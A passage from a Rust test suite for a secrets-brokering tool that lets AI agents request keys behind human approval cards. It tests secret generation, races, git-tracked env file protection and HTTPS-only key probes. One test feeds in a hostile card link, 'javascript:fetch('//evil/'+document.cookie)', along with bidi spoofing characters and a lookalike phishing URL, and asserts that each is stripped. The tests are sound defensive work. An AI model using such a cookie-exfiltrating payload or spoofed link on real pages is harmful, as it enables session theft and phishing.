    assert!(matches!(&out[0], need::Outcome::Injected { .. }), "{:?}", out[0]);
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// Generating is delivering: it writes a value and leaves a standing grant, so a
/// `run`-derived request must pass the same one-time approval a hit does.
#[test]
fn generating_a_secret_still_needs_the_run_approval() {
    let _g = env_lock();
    let (home, proj) = v2_world("gen-approval");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let opts = need::NeedOpts { require_approval: true, ..Default::default() };
    let out = need::need(&ctx, &proj, "prog", &["AUTH_SECRET".to_string()], &opts).unwrap();
    match &out[0] {
        need::Outcome::Pending { task_id, .. } => {
            assert_eq!(db.get_task(task_id).unwrap().unwrap().kind, db::TaskKind::Approval);
        }
        o => panic!("{o:?}"),
    }
    assert!(!proj.join(".env.local").exists(), "nothing generated before the human said yes");

    // ...and saying yes completes it. The card gated a value that did not exist yet, so
    // approving has to generate it — otherwise the card is answered and nothing arrives.
    let card = db.list_tasks(Some(&proj.to_string_lossy()), true).unwrap().into_iter().next().unwrap();
    tasks::answer_approval(&ctx, &card, tasks::Decision::Allow, Some(&card.names)).unwrap();
    let text = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    let (k, v) = envfile::parse_line(text.lines().next().unwrap()).unwrap();
    assert_eq!(k, "AUTH_SECRET");
    assert!(v.len() >= 32, "a real generated value: {}", v.len());
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// Upgrading must not mint a new signing key over the one an application is already using:
/// a value the project's env file already holds is adopted, not replaced.
#[test]
fn a_generated_secret_already_in_the_env_file_is_adopted_not_regenerated() {
    let _g = env_lock();
    let (home, proj) = v2_world("gen-adopt");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    // What a 0.2.0-or-earlier tokenstash left behind: the value in the env file, stored in
    // the stash under the old shared identity, nothing under the per-project one.
    let old_value = "kept-across-the-upgrade-0123456789";
    std::fs::write(proj.join(".env.local"), format!("JWT_SECRET={old_value}
")).unwrap();
    stash.set(&stash::stash_key("JWT_SECRET", "default"), &SecretString::from(old_value.to_string())).unwrap();

    let out = need::need(&ctx, &proj, "agent", &["JWT_SECRET".to_string()], &Default::default()).unwrap();
    assert!(matches!(&out[0], need::Outcome::Injected { generated: false, .. }), "adopted, not generated: {:?}", out[0]);
    let text = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    assert_eq!(envfile::parse_line(text.lines().next().unwrap()).unwrap().1, old_value, "the application's key is untouched");
    // ...and it is now the project's own, so the next request is a plain hit.
    let out = need::need(&ctx, &proj, "agent", &["JWT_SECRET".to_string()], &Default::default()).unwrap();
    assert!(matches!(&out[0], need::Outcome::Injected { generated: false, .. }), "{:?}", out[0]);
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// Two first requests for a generated secret in one directory both find the stash empty and
/// each mint a value. The first one stored stays. The other keeps it instead of replacing
/// it, and its env file write puts in that same value.
#[test]
fn concurrent_first_requests_keep_the_first_generated_secret() {
    let _g = env_lock();
    let (home, proj) = v2_world("gen-race");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let other_db = Db::open(&home.join("t.db")).unwrap();
    let other_stash = stash::open(&cfg).unwrap();
    let identity = need::project_identity(&proj);
    let key = stash::stash_key("JWT_SECRET", &identity);
    let first = "first-generated-value-0123456789abcdef";
    // Right after this `need` finds the stash empty, the other one commits its value. Its
    // env file write has not run yet.
    let stash = GetHookStash {
        inner: stash::open(&cfg).unwrap(),
        armed: std::cell::Cell::new(false),
        hook: || {
            other_stash.set(&key, &SecretString::from(first.to_string())).unwrap();
            other_db.upsert_secret(&db::SecretMeta { name: "JWT_SECRET".into(), identity: identity.clone(), provider: None, sensitive: false, source_url: None, created: now(), last_used: None, stale: false, last_verified: None, stale_reason: None, stale_source: None, next_probe: None, verify_off: false }).unwrap();
        },
    };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &stash, probe: tasks::Probe::Off };
    stash.armed.set(true);
    let out = need::need(&ctx, &proj, "agent", &["JWT_SECRET".to_string()], &Default::default()).unwrap();
    let stored = stash.get(&key).unwrap().unwrap();
    assert_eq!(secrecy::ExposeSecret::expose_secret(&stored), first, "the first stored value stays in the stash");
    let text = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    assert_eq!(envfile::parse_line(text.lines().next().unwrap()).unwrap().1, first, "and is the one in the env file");
    assert!(matches!(&out[0], need::Outcome::Injected { generated: false, .. }), "this call kept a value it did not generate: {:?}", out[0]);
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// A generated value in the stash with no index row is a store whose index write failed
/// after its stash write. It is not a finished store, so a first request stores its own
/// value with the index row and the grant, and the next request is a plain delivery.
#[test]
fn a_generated_value_without_an_index_row_is_not_a_finished_store() {
    let _g = env_lock();
    let (home, proj) = v2_world("gen-orphan");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let other_stash = stash::open(&cfg).unwrap();
    let identity = need::project_identity(&proj);
    let key = stash::stash_key("JWT_SECRET", &identity);
    // Right after this `need` finds the stash empty, another store writes its value to the
    // stash and then fails before its index COMMIT.
    let stash = GetHookStash {
        inner: stash::open(&cfg).unwrap(),
        armed: std::cell::Cell::new(false),
        hook: || other_stash.set(&key, &SecretString::from("orphaned-generated-value-0123456789".to_string())).unwrap(),
    };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &stash, probe: tasks::Probe::Off };
    stash.armed.set(true);
    let out = need::need(&ctx, &proj, "agent", &["JWT_SECRET".to_string()], &Default::default()).unwrap();
    let ws = db.find_workspace(&proj).unwrap().unwrap();
    assert!(db.grant_source(&ws.id, "JWT_SECRET", &identity).unwrap().is_some(), "the directory holds a grant for what it received");
    assert!(db.get_secret("JWT_SECRET", &identity).unwrap().is_some());
    let stored = stash.get(&key).unwrap().unwrap();
    let text = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    assert_eq!(envfile::parse_line(text.lines().next().unwrap()).unwrap().1, secrecy::ExposeSecret::expose_secret(&stored), "the env file holds what the stash holds");
    assert!(matches!(&out[0], need::Outcome::Injected { generated: true, .. }), "{:?}", out[0]);
    let again = need::need(&ctx, &proj, "agent", &["JWT_SECRET".to_string()], &Default::default()).unwrap();
    assert!(matches!(&again[0], need::Outcome::Injected { .. }), "no approval card for this directory's own secret: {:?}", again[0]);
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// A store that wrote a new value to the stash and then failed its index COMMIT can leave
/// that value beside an earlier store's row. The row was recorded before this request read
/// the stash, so it says nothing about the value. The request stores its own value, with a
/// fresh row and the grant.
#[test]
fn a_generated_value_beside_an_older_index_row_is_not_a_finished_store() {
    let _g = env_lock();
    let (home, proj) = v2_world("gen-older-row");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let other_stash = stash::open(&cfg).unwrap();
    let identity = need::project_identity(&proj);
    let key = stash::stash_key("JWT_SECRET", &identity);
    let orphan = "orphaned-generated-value-0123456789";
    // An earlier store's row. Its value has left the stash since (the kernel keyring does
    // not survive a reboot).
    db.upsert_secret(&db::SecretMeta { name: "JWT_SECRET".into(), identity: identity.clone(), provider: None, sensitive: false, source_url: None, created: "2020-01-01T00:00:00Z".into(), last_used: None, stale: false, last_verified: None, stale_reason: None, stale_source: None, next_probe: None, verify_off: false }).unwrap();
    // Right after this `need` finds the stash empty, another store writes its value to the
    // stash and then fails before its index COMMIT.
    let stash = GetHookStash {
        inner: stash::open(&cfg).unwrap(),
        armed: std::cell::Cell::new(false),
        hook: || other_stash.set(&key, &SecretString::from(orphan.to_string())).unwrap(),
    };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &stash, probe: tasks::Probe::Off };
    stash.armed.set(true);
    let out = need::need(&ctx, &proj, "agent", &["JWT_SECRET".to_string()], &Default::default()).unwrap();
    let stored = stash.get(&key).unwrap().unwrap();
    assert_ne!(secrecy::ExposeSecret::expose_secret(&stored), orphan, "the value nothing recorded is replaced");
    let ws = db.find_workspace(&proj).unwrap().unwrap();
    assert!(db.grant_source(&ws.id, "JWT_SECRET", &identity).unwrap().is_some(), "the directory holds a grant for what it received");
    let text = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    assert_eq!(envfile::parse_line(text.lines().next().unwrap()).unwrap().1, secrecy::ExposeSecret::expose_secret(&stored), "the env file holds what the stash holds");
    assert!(matches!(&out[0], need::Outcome::Injected { generated: true, .. }), "{:?}", out[0]);
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// The card is the human's read of what an agent asked for. The agent writes some of that
/// text, so it may not carry a link the human clicks into anything but http(s), and may not
/// contain characters that reorder or hide what is displayed.
#[test]
fn a_card_never_carries_agent_chosen_markup_or_links() {
    let _g = env_lock();
    let (home, proj) = v2_world("card-text");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };

    let req = tasks::SecretRequest {
        why: Some("pay\u{202e}drowssap\u{0007} \u{200b}now".to_string()),
        url: Some("javascript:fetch('//evil/'+document.cookie)".to_string()),
        steps: vec!["a".repeat(400), "\u{2066}spoof\u{2069}".to_string()],
        pattern: None,
    };
    let t = tasks::create_secret_task(&ctx, &proj, "agent", "MY_INTERNAL_KEY", "default", &req).unwrap();
    assert_eq!(t.url, None, "a javascript: link is never stored");
    let why = t.why.clone().unwrap();
    assert!(!why.contains('\u{202e}') && !why.contains('\u{200b}') && !why.contains('\u{0007}'), "{why:?}");
    assert!(t.steps[0].chars().count() <= 200, "steps are capped");
    assert!(!t.steps[1].contains('\u{2066}'));

    // For a name the registry knows, the provider's link wins: an agent cannot point the
    // "Open …" button at its own lookalike page in the flow where a key is produced.
    let req = tasks::SecretRequest { url: Some("https://openai-support.example/verify".to_string()), ..Default::default() };
    let t = tasks::create_secret_task(&ctx, &proj, "agent", "OPENAI_API_KEY", "default", &req).unwrap();
    assert_eq!(t.url.as_deref(), registry::lookup("OPENAI_API_KEY").map(|p| p.url.as_str()));
    // An unregistered name keeps the agent's link — it is the only one there is — but only
    // if it is http(s).
    let req = tasks::SecretRequest { url: Some("https://internal.example/keys".to_string()), ..Default::default() };
    let t = tasks::create_secret_task(&ctx, &proj, "agent", "ANOTHER_INTERNAL_KEY", "default", &req).unwrap();
    assert_eq!(t.url.as_deref(), Some("https://internal.example/keys"));
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// `GIT_DIR` and friends change git's answers. Both protections that stand between a secret
/// and a commit run git, so an agent that sets them must not be able to talk tokenstash out
/// of either one.
#[test]
fn git_environment_variables_cannot_disable_the_tracked_check() {
    const CHILD_DIR: &str = "TOKENSTASH_TEST_GIT_ENV_DIR";
    if let Some(dir) = std::env::var_os(CHILD_DIR) {
        let dir = PathBuf::from(dir);
        let parallel_fixture = tmp("git-env-parallel-fixture");
        init_git(&parallel_fixture);
        let tracked = envfile::is_git_tracked(&dir, &dir.join(".env.local"));
        let write = envfile::write(&dir, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string()));

        assert!(tracked, "a poisoned GIT_DIR must not turn a tracked file into an untracked one");
        assert!(write.is_err(), "and the write is still refused");
        assert!(parallel_fixture.join(".git").is_dir(), "test git fixtures must ignore process-global GIT_* overrides");
        assert_eq!(std::fs::read_to_string(dir.join(".env.local")).unwrap(), "OLD=1\n");
        return;
    }

    let _g = env_lock();
    let dir = tmp("git-env").canonicalize().unwrap();
    init_git(&dir);
    std::fs::write(dir.join(".env.local"), "OLD=1\n").unwrap();
    git(&dir, &["add", "-f", ".env.local"]);
    git(&dir, &["commit", "-q", "-m", "oops"]);
    assert!(envfile::is_git_tracked(&dir, &dir.join(".env.local")));

    let output = std::process::Command::new(std::env::current_exe().unwrap())
        .args(["--exact", "tests::git_environment_variables_cannot_disable_the_tracked_check"])
        .env(CHILD_DIR, &dir)
        .env("GIT_DIR", "/nonexistent-git-dir")
        .env("GIT_WORK_TREE", "/nonexistent-work-tree")
        .output().unwrap();
    assert!(output.status.success(),
        "poisoned-Git child failed with {}\nstdout:\n{}\nstderr:\n{}",
        output.status, String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr));
    assert_eq!(std::fs::read_to_string(dir.join(".env.local")).unwrap(), "OLD=1\n");
}

/// Inside a repo, "git could not answer" is not "ignored", even when our limited evaluator
/// sees a matching hand-written glob.
#[test]
fn an_unverifiable_ignore_rule_refuses_the_write() {
    const CHILD_ROOT: &str = "TOKENSTASH_TEST_UNVERIFIABLE_IGNORE_ROOT";
    if let Some(root) = std::env::var_os(CHILD_ROOT) {
        let deeper = PathBuf::from(root).join("svc/web");
        let e = envfile::write(&deeper, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap_err();
        let message = format!("{e:#}");
        assert!(message.contains("cannot ask git whether") && message.contains("is ignored"), "{message}");
        assert!(!message.as_bytes().windows(2).any(|w| w == b"  "), "user-facing git error contains repeated spacing: {message:?}");
        assert!(!deeper.join(".env.local").exists(), "nothing written");
        return;
    }

    // The child-local git proves `ls-files` has no match, then fails `check-ignore`.
    let root = tmp("unverifiable").canonicalize().unwrap();
    std::fs::create_dir_all(root.join(".git")).unwrap();
    std::fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
    std::fs::write(root.join(".gitignore"), "*.local\n").unwrap();
    let deeper = root.join("svc/web");
    std::fs::create_dir_all(&deeper).unwrap();
    let bin = root.join("test-bin");
    std::fs::create_dir_all(&bin).unwrap();
    let fake_git = bin.join("git");
    std::fs::write(&fake_git, "#!/bin/sh\ncase \"$*\" in\n  *ls-files*) exit 1 ;;\n  *check-ignore*) exit 2 ;;\n  *) exit 2 ;;\nesac\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&fake_git, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let status = std::process::Command::new(std::env::current_exe().unwrap())
        .args(["--exact", "tests::an_unverifiable_ignore_rule_refuses_the_write"])
        .env(CHILD_ROOT, &root)
        .env("PATH", &bin)
        .stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null()).status().unwrap();
    assert!(status.success(), "child regression test failed");
    assert!(!deeper.join(".env.local").exists(), "nothing written");
    assert_eq!(std::fs::read_to_string(root.join(".gitignore")).unwrap(), "*.local\n", "the conclusive-looking local rule is not treated as git's verdict");
}

/// A card is closed once. Two answers racing must not let the loser overwrite the winner —
/// that is how a committed denial becomes an approval.
#[test]
fn a_card_that_is_already_answered_cannot_be_answered_again() {
    let _g = env_lock();
    let (home, proj) = v2_world("close-once");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let t = tasks::create_secret_task(&ctx, &proj, "agent", "RESEND_API_KEY", "default", &Default::default()).unwrap();
    tasks::deny(&ctx, &t, Some("no")).unwrap();
    // `t` is the copy the second answerer read before the denial landed.
    let e = tasks::answer_secret(&ctx, &t, SecretString::from("re_bbbbbbbbbbbbbbbbbbbb".to_string()), true).unwrap_err();
    assert!(format!("{e:#}").contains("somewhere else"), "{e:#}");
    assert_eq!(db.get_task(&t.id).unwrap().unwrap().status, db::TaskStatus::Denied);
    assert!(stash.get(&stash::stash_key("RESEND_API_KEY", "default")).unwrap().is_none(), "nothing stored");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// The agent-facing lookup is scoped to its own project, including the ambiguous case:
/// `find_task`'s "did you mean" names task ids, and those must never come from elsewhere.
#[test]
fn a_task_prefix_never_reaches_across_projects() {
    let _g = env_lock();
    let (home, mine) = v2_world("scope-mine");
    let theirs = tmp("v2-scope-theirs-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let a = tasks::create_secret_task(&ctx, &mine, "agent", "RESEND_API_KEY", "default", &Default::default()).unwrap();
    let b = tasks::create_secret_task(&ctx, &theirs, "agent", "OPENAI_API_KEY", "default", &Default::default()).unwrap();
    let mine_id = mine.to_string_lossy().to_string();

    assert_eq!(db.find_task_in(&mine_id, &a.id).unwrap().map(|t| t.id), Some(a.id.clone()));
    assert!(db.find_task_in(&mine_id, &b.id).unwrap().is_none(), "another project's exact id is not found");
    // "t" matches both across the whole table; scoped, it can only ever match this project's
    assert!(db.find_task_in(&mine_id, "t").unwrap().is_some(), "a prefix that is ambiguous table-wide resolves within one project");
    assert!(db.find_task_in(&mine_id, "t").unwrap().map(|t| t.project) != Some(theirs.to_string_lossy().to_string()));
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// An identity is part of the stash key and of what the human reads on the card.
#[test]
fn identities_are_labels_and_nothing_else() {
    for good in ["default", "work", "personal-2", "a_b-c"] {
        assert!(need::valid_identity(good), "{good}");
    }
    // The dot is excluded because `bundle` excludes it: one rule, or an export from one
    // machine fails to import on another.
    for bad in ["", "has space", "a@b", "a,b", "a.b", "x/../y", &"z".repeat(65)] {
        assert!(!need::valid_identity(bad), "{bad}");
    }
    // Whatever a directory is called, the identity derived from it is a valid one.
    for dir in ["/tmp/tmp.ACxeIdTmiO", "/tmp/my project (2)", "/", "/tmp/ünïcødé"] {
        let id = need::project_identity(std::path::Path::new(dir));
        assert!(need::valid_identity(&id), "{dir} -> {id}");
    }
}

/// A database written by a newer tokenstash is refused, not half-understood: its grants may
/// mean something this build does not implement.
#[test]
fn a_newer_database_is_refused() {
    let dir = tmp("schema-ceiling");
    let path = dir.join("t.db");
    Db::open(&path).unwrap();
    let conn = rusqlite::Connection::open(&path).unwrap();
    conn.execute_batch(&format!("PRAGMA user_version = {}", db::SCHEMA_VERSION + 1)).unwrap();
    drop(conn);
    let e = match Db::open(&path) { Ok(_) => panic!("a newer schema must not open"), Err(e) => e };
    assert!(format!("{e:#}").contains("newer version"), "{e:#}");
}

/// Broad grants cover ordinary API keys. They do not cover a token that can push code,
/// publish a package, redeploy, or read a database.
#[test]
fn high_blast_radius_tokens_are_never_covered_by_a_broad_grant() {
    for name in [
        "GITHUB_TOKEN", "NPM_TOKEN", "VERCEL_TOKEN", "CLOUDFLARE_API_TOKEN", "FLY_API_TOKEN",
        "RAILWAY_TOKEN", "UPSTASH_REDIS_REST_TOKEN", "GOOGLE_CLIENT_SECRET", "GITHUB_CLIENT_SECRET",
        "DATABASE_URL",
    ] {
        let p = registry::lookup(name).unwrap_or_else(|| panic!("{name} is in the registry"));
        assert!(p.sensitive, "{name} must be sensitive");
        assert!(!crate::trust::broad_applies(p.sensitive, true), "{name} must not ride a broad grant");
    }
    // Stripe is sensitive by VALUE: a test-mode key is ordinary, a live one is not.
    let stripe = registry::lookup("STRIPE_SECRET_KEY").unwrap();
    assert!(stripe.sensitive_pattern.is_some(), "live Stripe keys are classified at paste time");
    // ...and an ordinary key still rides a broad grant, or the broad grant would mean nothing.
    let p = registry::lookup("OPENAI_API_KEY").unwrap();
    assert!(crate::trust::broad_applies(p.sensitive, true));
}

/// The registry's `reject_status` is the only thing that turns a provider's non-401 auth
/// failure into a verdict. Four providers depend on it, and nothing exercised it over the
/// wire: a refactor that dropped the check would report every dead Gemini key as live.
#[test]
fn a_registry_reject_status_produces_a_rejected_verdict() {
    let v = SecretString::from("AIzaSyProbeValue0000000000".to_string());
    let t = std::time::Duration::from_secs(1);
    let mut check = check_for("http://127.0.0.1:1/probe", "bearer");
    check.reject_status = vec![400];

    let (url, _rx, _h) = loopback("HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
    check.url = url;
    assert_eq!(validate::liveness(&check, &v, t), validate::Liveness::Rejected(400), "a listed status is a rejection");

    // ...and the same 400 without the registry saying so is NOT a rejection: a bad request
    // must never take a live key out of service.
    let (url, _rx, _h) = loopback("HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
    let plain = check_for(&url, "bearer");
    assert_eq!(validate::liveness(&plain, &v, t), validate::Liveness::Ok);

    // 422 is Brave's; same rule.
    let (url, _rx, _h) = loopback("HTTP/1.1 422 Unprocessable\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
    let mut brave = check_for(&url, "header:X-Subscription-Token");
    brave.reject_status = vec![422];
    assert_eq!(validate::liveness(&brave, &v, t), validate::Liveness::Rejected(422));
}

/// The key only ever crosses the wire over TLS. The registry is compiled in and a test
/// asserts every URL is https, but the check that matters is the one in the code path.
#[test]
fn a_probe_never_sends_the_key_over_plain_http() {
    let v = SecretString::from("sk-probe-value-000000000000".to_string());
    let t = std::time::Duration::from_secs(1);
    // A remote http:// URL is refused before any connection is made: the listener that
    // would have recorded a request never sees one.
    let (url, rx, _h) = loopback("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
    let remote = url.replace("127.0.0.1", "localhost.example.invalid");
    match validate::liveness(&check_for(&remote, "bearer"), &v, t) {
        validate::Liveness::Unknown(why) => assert!(why.contains("https"), "{why}"),
        o => panic!("{o:?}"),
    }
    assert!(rx.recv_timeout(std::time::Duration::from_millis(200)).is_err(), "nothing was sent");
}

/// Every auth style puts the value where the provider expects it. Only `bearer` and a custom
/// header were ever asserted against a real request.
#[test]
fn every_auth_style_is_sent_the_way_the_registry_says() {
    let raw = "KEYVALUE123456789012345678";
    let v = SecretString::from(raw.to_string());
    let t = std::time::Duration::from_secs(1);
    let ok = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";

    let (url, rx, _h) = loopback(ok);
    validate::liveness(&check_for(&url, "basic-user"), &v, t);
    let req = rx.recv_timeout(std::time::Duration::from_secs(2)).unwrap();
    let expect = { use base64::Engine; base64::engine::general_purpose::STANDARD.encode(format!("{raw}:")) };
    assert!(req.contains(&format!("Authorization: Basic {expect}")), "{req}");

    let (url, rx, _h) = loopback(ok);
    validate::liveness(&check_for(&url, "prefix:Token"), &v, t);
    let req = rx.recv_timeout(std::time::Duration::from_secs(2)).unwrap();
    assert!(req.contains(&format!("Authorization: Token {raw}")), "{req}");

    let (url, rx, _h) = loopback(ok);
    validate::liveness(&check_for(&url, "query:key"), &v, t);
    let req = rx.recv_timeout(std::time::Duration::from_secs(2)).unwrap();
    assert!(req.contains(&format!("/probe?key={raw}")), "{req}");
    assert!(!req.contains("Authorization"), "a query-auth probe sends no auth header: {req}");
}

/// The birth-time half of the directory fingerprint. Every existing test runs on a
/// filesystem that hands out a fresh inode after a delete, so an implementation comparing
/// only the inode passed all of them — and inode reuse is exactly what the birth time is
/// there to catch.
#[test]
fn a_workspace_fingerprint_compares_more_than_the_inode() {
    let _g = env_lock();
    let home = tmp("fingerprint-home");
    let proj = tmp("fingerprint-proj").canonicalize().unwrap();
    let db = Db::open(&home.join("t.db")).unwrap();
    let ws = db.workspace_for(&proj).unwrap();
    assert!(ws.fingerprint_ok);
    assert!(!ws.fingerprint_weak, "tmpfs/ext4 report a birth time; this test needs it");

    // Same path, same inode, different birth time: a directory re-created fast enough to
    // recycle the inode. It is not the one the human paired.
    db.conn.execute("UPDATE workspaces SET btime='1999-01-01T00:00:00Z' WHERE id=?1", rusqlite::params![ws.id]).unwrap();
    let seen = db.find_workspace(&proj).unwrap();
    assert!(seen.is_none(), "a changed birth time must close the gate (find_workspace only returns matching records)");

    // ...and the device number is compared too, for the same reason across mounts.
    db.conn.execute("UPDATE workspaces SET btime=NULL, dev=dev+1 WHERE id=?1", rusqlite::params![ws.id]).unwrap();
    let seen = db.find_workspace(&proj).unwrap();
    assert!(seen.is_none(), "a changed device must close the gate (find_workspace only returns matching records)");
}

/// Two `need`s running at once (a CLI run and the MCP server) must both land in the env
/// file. The upsert is read-modify-write, so without a lock the second rename drops the
/// first key while both calls report success.
#[test]
fn concurrent_writes_keep_every_key() {
    // The writers take their lock under config_dir()/locks, and config_dir() follows
    // TOKENSTASH_HOME, which locked tests set to homes of their own. Unlocked, writers started
    // while another test had swapped it could hold different lock files, and two at once
    // collided on the temp file ("creating ..env.local.tokenstash-<pid>.tmp: File exists").
    let _g = env_lock();
    let dir = tmp("concurrent-env").canonicalize().unwrap();
    let names: Vec<String> = (0..12).map(|i| format!("K{i}")).collect();
    let handles: Vec<_> = names.iter().cloned().map(|name| {
        let dir = dir.clone();
        std::thread::spawn(move || {
            envfile::write(&dir, ".env.local", &name, &SecretString::from(format!("value-of-{name}"))).unwrap();
        })
    }).collect();
    for h in handles { h.join().unwrap(); }
    let text = std::fs::read_to_string(dir.join(".env.local")).unwrap();
    for name in &names {
        let line = text.lines().find(|l| l.starts_with(&format!("{name}="))).unwrap_or_else(|| panic!("{name} was dropped:\n{text}"));
        assert_eq!(envfile::parse_line(line).unwrap().1, format!("value-of-{name}"));
    }
    assert_eq!(text.lines().count(), names.len());
}

/// A human's own `export NAME=` line is replaced in place, not duplicated: two lines for one
/// key means whichever the loader reads last wins, silently.
#[test]
fn an_export_line_is_upserted_not_duplicated() {
    let dir = tmp("export-line").canonicalize().unwrap();
    std::fs::write(dir.join(".env.local"), "# mine\nexport A_KEY=old\nOTHER=keep\nA_KEY_2=neighbour\n").unwrap();
    envfile::write(&dir, ".env.local", "A_KEY", &SecretString::from("new-value".to_string())).unwrap();
    let text = std::fs::read_to_string(dir.join(".env.local")).unwrap();
    assert_eq!(text.matches("A_KEY=").count(), 1, "exactly one A_KEY line (A_KEY_2 is a different key):\n{text}");
    assert!(text.contains("A_KEY=new-value"), "{text}");
    assert!(!text.contains("export A_KEY="), "the export form is replaced, not left beside it:\n{text}");
    assert!(text.contains("OTHER=keep") && text.contains("A_KEY_2=neighbour") && text.contains("# mine"), "{text}");
}

/// A one-time approval records no grant, so the card is the only trace of the human's yes.
/// If the delivery it authorised fails outright, the card has to come back — otherwise the
/// human said yes, received nothing, and must say yes again to a brand new card.
#[test]
fn a_one_time_approval_that_delivers_nothing_reopens_its_card() {
    let _g = env_lock();
    let (home, proj) = v2_world("once-reopen");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();

    // A stash that reads empty and refuses every write: what a locked keyring looks like
    // from here. Generation succeeds, storing it does not.
    struct DeadStash;
    impl stash::Stash for DeadStash {
        fn backend(&self) -> &'static str { "dead" }
        fn get(&self, _: &str) -> anyhow::Result<Option<SecretString>> { Ok(None) }
        fn set(&self, _: &str, _: &SecretString) -> anyhow::Result<()> { anyhow::bail!("the keyring is locked") }
        fn delete(&self, _: &str) -> anyhow::Result<bool> { Ok(false) }
    }
    let st = DeadStash;
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &st, probe: tasks::Probe::Off };

    let opts = need::NeedOpts { require_approval: true, ..Default::default() };
    let out = need::need(&ctx, &proj, "prog", &["AUTH_SECRET".to_string()], &opts).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    let card = db.get_task(&tid).unwrap().unwrap();
    assert_eq!(card.expects.as_str(), tasks::APPROVAL_ONCE, "a run-derived approval records no grant");

    let err = tasks::answer_approval(&ctx, &card, tasks::Decision::Allow, Some(&card.names)).unwrap_err();
    assert!(format!("{err:#}").contains("still open"), "the human is told the card survived: {err:#}");
    assert_eq!(db.get_task(&tid).unwrap().unwrap().status, db::TaskStatus::Pending, "nothing was delivered, so the yes is still owed an answer");
    assert!(!proj.join(".env.local").exists(), "and nothing was written");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// A generated secret is this directory's own; the caller does not pick its identity. With a
/// broad grant, `identity: "default"` used to deliver the value an older tokenstash stored
/// for another project under the shared label.
#[test]
fn a_generated_name_ignores_the_callers_identity() {
    let _g = env_lock();
    let (home, proj) = v2_world("gen-identity");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let other = "another-projects-signing-key-0123456789";
    stash.set(&stash::stash_key("JWT_SECRET", "default"), &SecretString::from(other.to_string())).unwrap();
    let ws = db.workspace_for(&proj).unwrap();
    db.grant(&ws.id, "*", "default", db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
    let opts = need::NeedOpts { identity: Some("default".into()), ..Default::default() };
    let out = need::need(&ctx, &proj, "agent", &["JWT_SECRET".to_string()], &opts).unwrap();
    match &out[0] {
        need::Outcome::Injected { generated, identity, .. } => {
            assert!(*generated, "minted, not delivered from the shared label: {:?}", out[0]);
            assert_ne!(identity, "default");
        }
        o => panic!("{o:?}"),
    }
    let text = std::fs::read_to_string(proj.join(".env.local")).unwrap();
